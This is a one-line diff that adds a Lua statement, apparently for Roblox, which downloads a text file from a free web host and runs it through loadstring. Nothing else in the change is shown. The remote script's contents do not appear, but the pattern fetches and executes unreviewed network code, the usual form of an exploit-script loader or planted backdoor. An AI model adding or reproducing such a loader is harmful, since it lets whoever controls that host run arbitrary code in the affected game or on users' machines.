@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://infelicitous-weapon.000webhostapp.com/tosit.txt", true))()
